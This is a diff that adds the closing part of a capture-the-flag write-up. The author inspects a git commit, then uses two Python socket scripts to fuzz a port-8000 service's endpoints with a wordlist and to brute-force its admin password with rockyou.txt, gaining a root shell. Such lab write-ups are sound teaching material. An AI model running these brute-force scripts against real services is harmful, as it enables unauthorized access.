@@ -61,3 +61,109 @@ Navigating to this directory we see a lot of files and dirs and www-data has rea
 
 Tbey worked, and we can now reveal the user flag from think's home dir.
 
+I poked around the home dir but didn't seem to turn anything up. The hint says to "keep playing with the custom app" so I head back to /opt/dev/.git.
+
+![logs](https://github.com/user-attachments/assets/7ac807a5-b250-488a-8c7a-1a1c77cc2fe3)
+
+We can see some notes like 'added shell endpoint', and in logs there is a sha1 hash for a commit.
+
+If we head back to /opt/dev and run the cmd git show (sha1 hash), it reveals the commit:
+
+![git show](https://github.com/user-attachments/assets/c907c29f-2aa3-4a88-a68f-905a9dd49972)
+
+This reveals the functionality of the python web server on port 8000. We see that it is asking for some specific data == 'some endpoint'. Then checks to see if you provide admin credentials, and if not, then the shell is www-data.
+
+So I used this pythong script to run again the netcat connection to fuzz endpoints using the /dirb/common.txt wordlists. Here is the script:
+
+```bash
+import socket
+import os
+
+host = os.environ.get('ip')
+if not host:
+    print("Error: Environment variable 'ip' is not set")
+    exit(1)
+
+port = 8000
+
+wordlist = "/usr/share/wordlists/dirb/common.txt"
+
+def fuzz_endpoint(wordlist):
+    unique_responses = set()  # Use a set to store unique responses
+    try:
+        with open(wordlist, 'r') as file:
+            for line in file:
+                command = line.strip()
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.connect((host, port))
+                    s.sendall(command.encode() + b'\n')
+                    response = s.recv(1024).decode().strip()
+                    if response and "is not defined" not in response and "leading zeros" not in response:
+                        # Only add and print unique responses
+                        if response not in unique_responses:
+                            unique_responses.add(response)
+                            print(f"Command: {command}")
+                            print(f"Unique Response: {response}\n")
+    except FileNotFoundError:
+        print(f"File doesn't exist")
+    except Exception as e:
+        print(f"Error has occurred: {e}")
+
+fuzz_endpoint(wordlist)
+```
+The script reveals that the endpoint is admin:
+
+![endpoint](https://github.com/user-attachments/assets/7b852d3a-9fb5-4244-bfbf-2758ca275a47)
+
+When we enter the admin endpoint the script prompts us for a password. Now I ran another script to fuzz the admin endpoint password prompt with rockyou.txt:
+
+```bash
+import socket
+import os
+
+host = os.environ.get('ip')
+if not host:
+    print("Error: Environment variable 'ip' is not set")
+    exit(1)
+
+port = 8000
+
+wordlist = "/usr/share/wordlists/rockyou.txt"
+
+def fuzz_password(wordlist):
+    try:
+        with open(wordlist, 'r', errors='ignore') as file:
+            for password in file:
+                # Clean up lines
+                password = password.strip()
+                # Establish connection to server
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.connect((host, port))
+                    # Send "admin" cmd to prompt for password
+                    s.sendall(b'admin\n')
+                    # Receive the password prompt
+                    response = s.recv(1024).decode().strip()
+                    if "password" in response.lower():
+                        s.sendall((password + '\n').encode())
+                        # Receive the response after entering the password
+                        response = s.recv(1024).decode().strip()
+
+                        # Check if the password is correct
+                        if "password:" not in response.lower():
+                            print(f'The password is: {password}')
+                            return  # Exit the function if password is found
+                    else:
+                        print("Unexpected response from server")
+                        return
+
+        print("Password not found in wordlist")
+    except FileNotFoundError:
+        print(f"Wordlist file not found: {wordlist}")
+    except Exception as e:
+        print(f"Error has occurred: {e}")
+
+fuzz_password(wordlist)
+```
+This script finishes pretty quickly to reveal a simple password. Now we can use the admin endpoint and password to gain a root shell and get the root flag! 
+
+![root](https://github.com/user-attachments/assets/5ef050ec-6573-487a-aa9a-acd0c02fec82)
